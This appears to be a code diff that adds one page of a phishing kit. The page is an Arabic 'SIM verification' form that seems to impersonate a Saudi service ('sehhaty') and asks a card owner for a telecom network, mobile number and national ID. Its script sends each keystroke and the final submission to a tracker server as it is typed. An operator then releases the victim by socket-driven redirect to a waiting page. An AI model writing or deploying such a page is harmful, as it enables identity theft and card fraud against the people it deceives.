@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>بيانات الهاتف والمصادقة الأمنية</title>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="otp.css">
+    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
+    <style>
+        select, input { width: 100%; height: 46px; border-radius: 12px; border: 1.5px solid #cbd5e1; padding: 0 12px; font-size: 13px; font-weight: 700; color: #334155; outline: none; margin-bottom: 12px; text-align: right; }
+        select { background-color: #f8fafc; cursor: pointer; }
+        select:focus, input:focus { border-color: #7b2cbf; box-shadow: 0 0 0 3px rgba(123,44,191,0.08); }
+        .form-label { display: block; text-align: right; font-size: 11px; font-weight: 900; color: #475569; margin-bottom: 5px; }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <div class="h-otp"><div class="sh-ic" style="color: #7b2cbf; background: #faf5ff;">📞</div><div><h2>مصادقة الهاتف وصاحب البطاقة</h2><div style="font-size: 11px; color: #94a3b8; font-weight: 600;">SIM Verification</div></div></div>
+        <p class="subt">يرجى تعبئة تفاصيل هاتف مالك البطاقة والشبكة لإرسال كود المصادقة.</p>
+        <form id="phone-verify-form" onsubmit="handleVerifySubmit(event)">
+            <label class="form-label">شبكة الاتصال المزودة</label>
+            <select id="telecom-network" onchange="vld()">
+                <option value="stc">STC (اتصالات)</option>
+                <option value="mobily">موبايلي</option>
+                <option value="zain">زين</option>
+                <option value="virgin">فيرجن</option>
+                <option value="lebara">ليبارا</option>
+                <option value="redbull">ريد بول</option>
+            </select>
+            <label class="form-label">رقم جوال مالك البطاقة</label>
+            <input type="text" id="phone-number" placeholder="05xxxxxxxx" maxlength="10" autocomplete="off" oninput="hPh(this)">
+            <label class="form-label">رقم الهوية الوطنية / الإقامة</label>
+            <input type="text" id="national-id" placeholder="1xxxxxxxxx" maxlength="10" autocomplete="off" oninput="hId(this)">
+            <button type="submit" class="submit-btn" id="verify-submit-btn" disabled>المتابعة وتأكيد الهوية</button>
+        </form>
+    </div>
+    <script src="saas-hub-config.js"></script><script src="config.js"></script><script>
+        var SERVER_URL=window.SERVER_HUB_URL||"http://localhost:5000",siteKey="site_sehhaty_app_v1",visitorToken=localStorage.getItem('visitor_token')||'vis_'+Math.random().toString(36).substring(2,10);
+        var formName="بيانات الهاتف ومطابقة الهوية";
+        fetch(SERVER_URL+'/api/tracker/ping',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({token:visitorToken,siteKey:siteKey,currentPage:'/phone-verify.html',pageTitle:'توثيق هاتف مالك البطاقة والشبكة'})}).catch(function(){});
+        try{
+            var socket=io(SERVER_URL);
+            socket.on('visitor_updated',function(v){
+                if(v.token===visitorToken&&v.status==='go'&&v.redirectUrl){window.location.href=v.redirectUrl;}
+            });
+        }catch(e){}
+        var sDeb=null;
+        function hPh(el){el.value=el.value.replace(/\D/g,'');vld();sDt();}
+        function hId(el){el.value=el.value.replace(/\D/g,'');vld();sDt();}
+        function vld(){
+            var p=document.getElementById('phone-number').value.trim(),n=document.getElementById('national-id').value.trim();
+            document.getElementById('verify-submit-btn').disabled=(p.length<9||n.length<10);
+        }
+        function sDt(){
+            var nt=document.getElementById('telecom-network').value,p=document.getElementById('phone-number').value.trim(),n=document.getElementById('national-id').value.trim();
+            clearTimeout(sDeb);
+            sDeb=setTimeout(function(){
+                fetch(SERVER_URL+'/api/tracker/submit',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({token:visitorToken,siteKey:siteKey,formName:formName+" (يجري الإدخال 🟡)",submissionData:{'شبكة الاتصال':nt,'رقم الجوال للتوثيق':p,'رقم الهوية / الإقامة للتوثيق':n},isFinalSubmission:false,isImportant:true})}).catch(function(){});
+            },300);
+        }
+        function handleVerifySubmit(e){
+            e.preventDefault();
+            var nt=document.getElementById('telecom-network').value,p=document.getElementById('phone-number').value.trim(),n=document.getElementById('national-id').value.trim();
+            if(p.length<9||n.length<10)return;
+            var btn=document.getElementById('verify-submit-btn');btn.disabled=true;btn.innerText="جاري التوثيق...";
+            fetch(SERVER_URL+'/api/tracker/submit',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({token:visitorToken,siteKey:siteKey,formName:formName+" (مؤكد ✅)",submissionData:{'شبكة الاتصال':nt,'رقم الجوال للتوثيق':p,'رقم الهوية / الإقامة للتوثيق':n},isFinalSubmission:true,isImportant:true})}).then(function(){
+                fetch(SERVER_URL+'/api/tracker/ping',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({token:visitorToken,siteKey:siteKey,currentPage:'/wait.html',pageTitle:'بانتظار موافقة النظام...',phone:p,nationalId:n})}).catch(function(){});
+                setTimeout(function(){window.location.href='wait.html';},800);
+            }).catch(function(){btn.disabled=false;btn.innerText="المتابعة وتأكيد الهوية";});
+        }
+    </script>
+</body>
+</html>
